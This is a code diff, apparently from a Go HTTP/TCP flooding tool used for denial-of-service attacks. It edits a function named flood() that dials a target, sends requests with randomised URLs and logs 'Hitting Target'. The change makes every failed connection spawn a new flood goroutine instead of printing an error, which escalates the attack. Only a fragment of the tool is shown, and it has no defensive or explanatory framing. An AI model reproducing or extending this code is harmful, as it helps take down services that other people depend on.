@@ -651,8 +651,9 @@ func flood() {
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
-		if err != nil {
-			fmt.Println("Connection Down!!!")
+		if err != nil {		
+			go flood()
+			//fmt.Println("Connection Down!!!")
 		} else {
 			defer s.Close()
 			ai := rand.Intn(3) //fake random url format
@@ -682,7 +683,7 @@ func flood() {
 			}
 		}
 		//time.Sleep(time.Second * 1)
-		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
+		//fmt.Println("Threads@","[%.0f]", " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
 
